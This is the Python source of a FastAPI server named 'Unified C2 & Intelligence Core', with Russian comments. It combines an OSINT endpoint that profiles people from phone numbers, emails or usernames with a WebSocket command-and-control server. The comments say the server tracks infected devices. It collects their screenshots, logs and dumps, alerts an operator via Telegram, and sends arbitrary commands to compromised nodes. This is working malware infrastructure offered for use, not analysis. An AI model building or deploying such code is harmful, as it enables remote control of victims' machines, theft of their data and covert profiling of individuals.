import os
import asyncio
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import requests
import phonenumbers
from phonenumbers import carrier, geocoder
from database import init_db, get_db

app = FastAPI(title="Unified C2 & Intelligence Core", version="2.0.0")

# Хранилище активных WebSocket соединений зараженных устройств
class ConnectionManager:
    def __init__(self):
        self.active_connections: dict[int, WebSocket] = {}

    async def connect(self, node_id: int, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[node_id] = websocket

    def disconnect(self, node_id: int):
        if node_id in self.active_connections:
            del self.active_connections[node_id]

    async def send_command(self, node_id: int, message: str):
        if node_id in self.active_connections:
            await self.active_connections[node_id].send_text(message)
            return True
        return False

manager = ConnectionManager()

@app.on_event("startup")
def startup():
    init_db()

# --- 1. КАСКАДНЫЙ / СВЯЗАННЫЙ OSINT ---
@app.post("/api/osint/cascade")
def cascade_osint(query: str = Form(...)):
    """Автоматически определяет тип данных и собирает максимальный профиль"""
    results = {"query": query, "nodes_found": []}
    
    # Проверка на телефон
    if query.startswith("+") or query.isdigit():
        try:
            parsed = phonenumbers.parse(query)
            results["type"] = "phone"
            results["valid"] = phonenumbers.is_valid_number(parsed)
            results["location"] = geocoder.description_for_number(parsed, "en")
            results["carrier"] = carrier.name_for_number(parsed, "en")
        except:
            pass
    
    # Проверка на username / email
    if "@" in query:
        results["type"] = "email"
        results["domain"] = query.split('@')[1]
        results["gravatar"] = f"https://www.gravatar.com/avatar/{query.lower().encode().hex()}?d=404"
    elif "type" not in results:
        results["type"] = "username"
        platforms = {
            "Telegram": f"https://t.me/{query}",
            "GitHub": f"https://github.com/{query}",
            "Instagram": f"https://instagram.com/{query}"
        }
        socials = {}
        for p, url in platforms.items():
            try:
                r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=3)
                socials[p] = (r.status_code == 200)
            except:
                socials[p] = False
        results["socials"] = socials

    return results

# --- 2. WEBSOCKET C2 СЕРВЕР ДЛЯ АГЕНТОВ ---
@app.websocket("/ws/agent/{node_id}")
async def agent_endpoint(websocket: WebSocket, node_id: int):
    await manager.connect(node_id, websocket)
    
    # Уведомление в Telegram (через Bot API webhook/request)
    TELEGRAM_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")
    ADMIN_CHAT_ID = os.getenv("TG_ADMIN_ID", "")
    if TELEGRAM_BOT_TOKEN and ADMIN_CHAT_ID:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": ADMIN_CHAT_ID,
            "text": f"[!] Узел #{node_id} вышел на связь и подключен к C2!"
        })

    try:
        while True:
            # Получение данных / телеметрии от агента
            data = await websocket.receive_text()
            # Обработка ответов (скриншоты, логи, дампы)
            with get_db() as conn:
                with conn.cursor() as cur:
                    cur.execute("INSERT INTO audit_logs (tool_name, target) VALUES (%s, %s)", 
                                ("c2_telemetry", f"Node {node_id}: {data[:50]}"))
                    conn.commit()
    except WebSocketDisconnect:
        manager.disconnect(node_id)
        if TELEGRAM_BOT_TOKEN and ADMIN_CHAT_ID:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
                "chat_id": ADMIN_CHAT_ID,
                "text": f"[х] Узел #{node_id} отключился."
            })

# --- 3. ДИСПЕТЧЕР УПРАВЛЕНИЯ ЧЕРЕЗ БОТА ---
@app.post("/api/c2/exec")
async def execute_agent_command(node_id: int = Form(...), action: str = Form(...)):
    success = await manager.send_command(node_id, action)
    if not success:
        raise HTTPException(status_code=404, detail="Узел не в сети или не найден.")
    return {"status": "command_dispatched", "node_id": node_id, "action": action}